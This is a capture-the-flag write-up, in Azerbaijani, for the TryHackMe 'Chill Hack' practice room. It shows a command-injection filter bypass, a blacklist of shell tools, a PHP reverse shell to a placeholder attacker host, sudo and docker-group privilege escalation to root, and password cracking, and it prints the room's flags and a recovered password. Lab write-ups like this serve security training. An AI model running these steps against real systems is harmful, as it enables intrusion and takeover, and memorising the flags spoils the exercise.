# 🧊 TryHackMe — Chill Hack Writeup

**Platforma:** TryHackMe  
**Room:** [Chill Hack](https://tryhackme.com/room/chillhack)  
**Çətinlik:** Easy  
**OS:** Linux  
**Mövzu:** Command Injection + Filter Bypass + Steganography + Docker Escape  

---

## 📋 Xülasə

Bu room-da veb saytda command injection tapırıq, filter bypass edərək reverse shell alırıq, steganography ilə parol tapırıq və Docker escape ilə root əldə edirik.

---

## 🔍 1. Kəşfiyyat (Reconnaissance)

### Nmap Scan

```bash
nmap -sV -sC -p- 10.10.X.X
```

**Nəticə:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```

3 port açıqdır:
- **21** — FTP (anonymous login icazəlidir!)
- **22** — SSH
- **80** — HTTP

---

## 📁 2. FTP — Anonymous Giriş

```bash
ftp 10.10.X.X
# Username: anonymous
# Password: (boş)
```

```bash
ftp> ls
ftp> get note.txt
```

**note.txt məzmunu:**
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

> 💡 2 username tapıldı: **Anurodh** və **Apaar**  
> 💡 Command injection var amma **filterləmə** var!

---

## 🌐 3. Web Kəşfiyyatı

### Gobuster ilə Directory Scan

```bash
gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirb/common.txt
```

**Nəticə:**
```
/secret    (Status: 301)
```

### /secret səhifəsi

`http://10.10.X.X/secret` — command execution sahəsi var!

**Blacklist (index.php-dən):**
```php
$blacklist = array('nc', 'python', 'bash', 'php', 'perl', 'rm', 
                   'cat', 'head', 'tail', 'python3', 'more', 
                   'less', 'sh', 'ls');
```

---

## 💥 4. Command Injection — Filter Bypass

Blacklist-dəki əmrləri **backslash** ilə bypass et:

```bash
# ls → l\s
# cat → c\at
# bash → ba\sh
```

**Faylları listlə:**
```bash
echo *
```

**Fayl oxu:**
```bash
awk '{print}' index.php
```

---

## 🐚 5. Reverse Shell

**Kali-də listener:**
```bash
nc -lvnp 4444
```

**Filter bypass ilə PHP reverse shell:**
```bash
p\hp -r '$sock=fsockopen("KALI_IP",4444);exec("sh <&3 >&3 2>&3");'
```

Shell aldıqdan sonra stabilləşdir:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## ⚡ 6. Privilege Escalation — www-data → apaar

```bash
sudo -l
```

```
(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

Skripti apaar olaraq işlət:
```bash
sudo -u apaar /home/apaar/.helpline.sh
```

```
Enter the person whom you want to talk with: test
Enter your message: /bin/bash
```

> ✅ **apaar** shell alındı!

---

## 🏁 7. User Flag

```bash
cat /home/apaar/local.txt
```

```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

> 🏁 **User Flag əldə edildi!**

---

## 🖼️ 8. Steganography — anurodh Parolu

### Şəkili tap

```bash
ls /var/www/files/images/
# hacker-with-laptop_23-2147985341.jpg
# 002d7e638fb463fb7a266f5ffc7ac47d.gif
```

### Kali-yə yüklə

Hədəf maşında:
```bash
cd /var/www/files/images && python3 -m http.server 9999
```

Kali-də:
```bash
wget http://10.10.X.X:9999/hacker-with-laptop_23-2147985341.jpg
```

### Stegseek ilə gizli faylı çıxar

```bash
stegseek hacker-with-laptop_23-2147985341.jpg /usr/share/wordlists/rockyou.txt
```

```
[i] Found passphrase: ""
[i] Original filename: "backup.zip"
```

> 💡 Steghide parolu **boşdur**!

### Zip parolu tap

```bash
zip2john hacker-with-laptop_23-2147985341.jpg.out > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
pass1word    (backup.zip)
```

### Zip aç

```bash
unzip hacker-with-laptop_23-2147985341.jpg.out
# Parol: pass1word
```

PHP faylında **Base64** encoded parol:
```
IWQwbnRLbjB3bVlwQHNzdzByZA==
```

### Decode et

```bash
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
```

```
!d0ntKn0wmYp@ssw0rd
```

> ✅ **anurodh** parolu tapıldı!

---

## 💻 9. SSH — anurodh

```bash
ssh anurodh@10.10.X.X
# Parol: !d0ntKn0wmYp@ssw0rd
```

```bash
id
```

```
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

> 💡 **docker** qrupundadır — exploit edilə bilər!

---

## 🐳 10. Docker Escape — ROOT

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

```
# whoami
root
```

> ✅ Root oldug!

---

## 🏆 11. Root Flag

```bash
cat /root/proof.txt
```

```
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

> 🏁 **Root Flag əldə edildi!**

---

## 📊 Xülasə Cədvəli

| Mərhələ | Alət | Nəticə |
|---|---|---|
| Port Scan | Nmap | FTP, SSH, HTTP tapıldı |
| FTP | anonymous | note.txt — username ipucu |
| Dir Scan | Gobuster | /secret tapıldı |
| Command Injection | Filter bypass (backslash) | RCE əldə edildi |
| Reverse Shell | PHP + nc | www-data shell |
| PrivEsc 1 | sudo .helpline.sh | apaar shell |
| User Flag | cat | local.txt |
| Steganography | stegseek + john | anurodh parolu |
| SSH | anurodh | docker qrupu |
| PrivEsc 2 | Docker escape | Root shell |
| Root Flag | cat | proof.txt |

---

## 🛠️ İstifadə Edilən Alətlər

- `nmap` — port kəşfiyyatı
- `ftp` — anonymous giriş
- `gobuster` — directory bruteforce
- `netcat` — reverse shell listener
- `stegseek` — steganography
- `zip2john` + `john` — zip parol sındırma
- `base64` — decode
- `docker` — privilege escalation
- [GTFOBins](https://gtfobins.github.io/)

---

## 📚 Öyrənilənlər

1. **FTP anonymous** həmişə yoxlanılmalıdır
2. **Blacklist filter bypass** — backslash (`\`) ilə əmrləri parçala
3. **Steganography** — şəkillərdə gizli məlumat ola bilər
4. **docker qrupu** — root-a ekvivalentdir!
5. `zip2john` + `john` — şifrəli zip-ləri sındırmaq üçün

---

## 🔗 Faydalı Linklər

- [GTFOBins — Docker](https://gtfobins.github.io/gtfobins/docker/)
- [RevShells Generator](https://www.revshells.com/)
- [StegSeek](https://github.com/RickdeJager/StegSeek)

---

*Writeup hazırlandı — TryHackMe Chill Hack Room*
